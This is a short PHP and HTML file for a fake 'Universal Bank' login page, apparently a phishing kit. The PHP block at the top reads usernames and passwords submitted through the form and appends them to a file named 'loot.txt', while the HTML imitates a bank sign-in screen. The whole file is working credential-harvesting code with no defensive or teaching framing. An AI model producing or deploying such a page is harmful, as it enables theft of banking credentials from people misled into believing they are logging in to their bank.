<?php
	if (isset($_GET['username']) && isset($_GET['password'])) {
		$file = fopen("loot.txt", "a+") or die();

		$user = "Username: ".$_GET['username']."\n";
		$pass = "Password: ".$_GET['password']."\n\n";

		fwrite($file, $user);
		fwrite($file, $pass);
		fclose($file);
	}
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="description" content="Bank Login">
	<meta name=viewport content="width=device-width, initial-scale=1">
	<title>Universal Bank Login</title>
	<!-- Stylesheets -->
	<link rel="stylesheet" type="text/css" href="bootstrap.css">
	<link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
	<header>
		<h1 style="color: #e43939;">The Universal Bank</h1>
	</header>
	<main>
		<h2 class="loginHeader" style="color: #e43939;">Login Page</h2>
		<form>
			<h4>Username</h4>
			<input class="form-control" type="text" name="username">
			<h4>Password</h4>
			<input class="form-control" type="text" name="password">
			<button class='btn btn-danger' type='submit'>Sign Up</button>
		</form>
	</main>
</body>
</html>